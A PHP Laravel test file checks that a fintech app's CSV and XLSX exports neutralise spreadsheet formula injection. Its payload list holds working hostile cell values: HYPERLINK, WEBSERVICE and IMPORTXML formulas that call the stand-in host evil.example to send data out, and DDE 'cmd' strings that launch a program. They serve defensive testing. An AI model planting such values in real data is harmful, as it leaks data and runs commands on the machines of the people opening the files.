<?php

namespace Tests\Feature\Fintech\Security;

use App\Models\Invoice;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Laravel\Sanctum\Sanctum;
use Symfony\Component\HttpFoundation\BinaryFileResponse;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Tests\Feature\Fintech\Security\Concerns\BuildsBusinesses;
use Tests\TestCase;

/**
 * CSV / Excel formula injection. Exports go to the accountant, who opens
 * them in Excel. A name that starts with = + - @ (or a tab/CR) and calls a
 * function or DDE (cmd|...) must arrive as text: a leading apostrophe in
 * CSV (App\Support\SafeExport::csvField), a string cell in .xlsx (never an
 * <f> formula element). A phone number such as "+91 98765 43210" must stay
 * exactly as typed.
 */
class SpreadsheetFormulaInjectionTest extends TestCase
{
    use BuildsBusinesses;
    use RefreshDatabase;

    private const PAYLOADS = [
        'customer' => '=HYPERLINK("http://evil.example/?d="&A1,"Pay here")',
        'item' => "+cmd|' /C calc'!A0",
        'vendor' => "-2+3+cmd|' /C calc'!A0",
        'seller' => "@SUM(1+1)*cmd|' /C calc'!A0",
        'expense' => '=1+1+WEBSERVICE("http://evil.example/")',
        'supplier' => '=IMPORTXML("http://evil.example/","//a")',
        'tab' => "\t=2+2+HYPERLINK(\"http://evil.example/\")",
    ];

    private array $a;

    protected function setUp(): void
    {
        parent::setUp();
        $this->freezeClock();
        $this->a = $this->buildBusiness('A');
        $a = $this->a;
        $a['customer']->forceFill(['name' => self::PAYLOADS['customer'], 'phone' => '+91 98765 43210'])->save();
        foreach (Invoice::where('company_id', $a['company']->id)->whereNotNull('customer_snapshot')->get() as $inv) {
            $snap = $inv->customer_snapshot;
            $snap['name'] = self::PAYLOADS['customer'];
            $inv->forceFill(['customer_snapshot' => $snap])->save();
        }
        $a['product']->forceFill(['name' => self::PAYLOADS['item']])->save();
        $a['vendor']->forceFill(['name' => self::PAYLOADS['vendor']])->save();
        $a['cashMemo']->forceFill(['seller_name' => self::PAYLOADS['seller']])->save();
        \App\Models\Expense::whereKey($a['cashMemo']->expense_id)->update(['vendor_name' => self::PAYLOADS['seller']]);
        $a['expense']->forceFill(['description' => self::PAYLOADS['expense'], 'vendor_name' => self::PAYLOADS['tab']])->save();
        $a['gstr2b']->forceFill(['supplier_name' => self::PAYLOADS['supplier'], 'document_number' => 'K-9'])->save();
    }

    private function body($res): string
    {
        $base = $res->baseResponse;
        if ($base instanceof StreamedResponse) {
            return $res->streamedContent();
        }
        if ($base instanceof BinaryFileResponse) {
            return (string) file_get_contents($base->getFile()->getPathname());
        }

        return (string) $res->getContent();
    }

    /** Cells Excel would run: =, @, tab, CR first, or +/- followed by a call/DDE. */
    private function dangerous(string $cell): bool
    {
        if ($cell === '' || is_numeric($cell)) {
            return false;
        }
        $f = $cell[0];

        return in_array($f, ['=', '@', "\t", "\r"], true)
            || (in_array($f, ['+', '-'], true) && preg_match('/[(!|:"=]/', $cell));
    }

    /** @return list<string> problems in one CSV document */
    private function csvProblems(string $csv, string $label, array &$seen): array
    {
        $problems = [];
        $csv = preg_replace('/^\xEF\xBB\xBF/', '', $csv);
        $h = fopen('php://memory', 'r+');
        fwrite($h, $csv);
        rewind($h);
        while (($row = fgetcsv($h, 0, ',', '"', '')) !== false) {
            foreach ($row as $cell) {
                $cell = (string) $cell;
                if ($this->dangerous($cell)) {
                    $problems[] = "{$label}: live formula cell " . json_encode($cell);
                }
                foreach (self::PAYLOADS as $k => $p) {
                    if (str_contains($cell, ltrim($p))) {
                        $seen[$k] = true;
                    }
                }
                if (str_contains($cell, '98765 43210') && $cell !== '+91 98765 43210') {
                    $problems[] = "{$label}: the phone number was altered to " . json_encode($cell);
                }
            }
        }
        fclose($h);

        return $problems;
    }

    /** @return list<string> problems in one .xlsx document */
    private function xlsxProblems(string $bytes, string $label, array &$seen): array
    {
        $path = tempnam(sys_get_temp_dir(), 'xl') . '.xlsx';
        file_put_contents($path, $bytes);
        $zip = new \ZipArchive();
        $this->assertTrue($zip->open($path) === true, "{$label} is a readable .xlsx");
        $problems = [];
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $name = $zip->getNameIndex($i);
            if (! preg_match('~^xl/(worksheets/sheet\d+|sharedStrings)\.xml$~', $name)) {
                continue;
            }
            $xml = (string) $zip->getFromIndex($i);
            if (preg_match('~<f[ >]~', $xml)) {
                $problems[] = "{$label}: {$name} contains a formula cell";
            }
            $text = html_entity_decode($xml, ENT_QUOTES | ENT_XML1);
            foreach (self::PAYLOADS as $k => $p) {
                if (str_contains($text, ltrim($p))) {
                    $seen[$k] = true;
                }
            }
        }
        $zip->close();

        return $problems;
    }

    public function test_every_export_writes_formula_like_names_as_inert_text(): void
    {
        $owner = $this->a['owner']->fresh();
        $web = [
            route('invoices.gstr1'), route('finance.aging.export.csv'), route('finance.gstr3b.export.csv'),
            route('finance.expenses.export.csv', ['period' => 'this_fy']), route('finance.cash-memos.export.csv'),
            route('finance.gstr2b.export', ['month' => '2026-09']), route('finance.gstr1.export.xlsx'),
        ];
        foreach (array_keys(config('reports.registry')) as $report) {
            $web[] = route('reports.export', [$report, 'csv']);
            $web[] = route('reports.export', [$report, 'xlsx']);
        }
        $api = ['/api/finance/aging/export/csv', '/api/finance/gstr3b/export/csv', '/api/finance/gstr1/export/csv', '/api/finance/expenses/export/csv'];

        $problems = [];
        $seen = [];
        foreach ([...array_map(fn ($u) => [$u, false], $web), ...array_map(fn ($u) => [$u, true], $api)] as [$url, $isApi]) {
            app('cache')->store()->flush();
            if ($isApi) {
                Sanctum::actingAs($owner);
                $res = $this->get($url, ['Accept' => 'text/csv']);
            } else {
                $res = $this->actingAs($owner)->get($url);
            }
            $this->assertSame(200, $res->getStatusCode(), "{$url} downloads");
            $body = $this->body($res);
            $problems = array_merge($problems, str_starts_with($body, 'PK')
                ? $this->xlsxProblems($body, $url, $seen)
                : $this->csvProblems($body, $url, $seen));
        }

        // The backup ZIP is a folder of CSVs.
        $zipBytes = $this->body($this->actingAs($owner)->get(route('backup.download'))->assertOk());
        $path = tempnam(sys_get_temp_dir(), 'bk') . '.zip';
        file_put_contents($path, $zipBytes);
        $zip = new \ZipArchive();
        $this->assertTrue($zip->open($path) === true);
        for ($i = 0; $i < $zip->numFiles; $i++) {
            if (str_ends_with($zip->getNameIndex($i), '.csv')) {
                $problems = array_merge($problems, $this->csvProblems((string) $zip->getFromIndex($i), 'backup/' . $zip->getNameIndex($i), $seen));
            }
        }
        $zip->close();

        $this->assertSame([], $problems, implode("\n", $problems));
        // Each payload reached at least one export, so the check above was not vacuous.
        $this->assertEqualsCanonicalizing(array_keys(self::PAYLOADS), array_keys($seen), 'payloads that never reached an export');
    }

    public function test_the_safe_export_rule_itself(): void
    {
        $f = fn ($v) => \App\Support\SafeExport::csvField($v);
        $this->assertSame("'=HYPERLINK(\"x\")", $f('=HYPERLINK("x")'));
        $this->assertSame("'@SUM(A1)", $f('@SUM(A1)'));
        $this->assertSame("'+cmd|' /C calc'!A0", $f("+cmd|' /C calc'!A0"));
        $this->assertSame("'-1+cmd|' /C calc'!A0", $f("-1+cmd|' /C calc'!A0"));
        $this->assertSame("'\t=1", $f("\t=1"));
        $this->assertSame("'\r=1", $f("\r=1"));
        $this->assertSame('+91 98765 43210', $f('+91 98765 43210'));
        $this->assertSame('-1250.50', $f('-1250.50'));
        $this->assertSame(-1250.5, $f(-1250.5));
        $this->assertSame('Sharma & Sons', $f('Sharma & Sons'));
    }
}
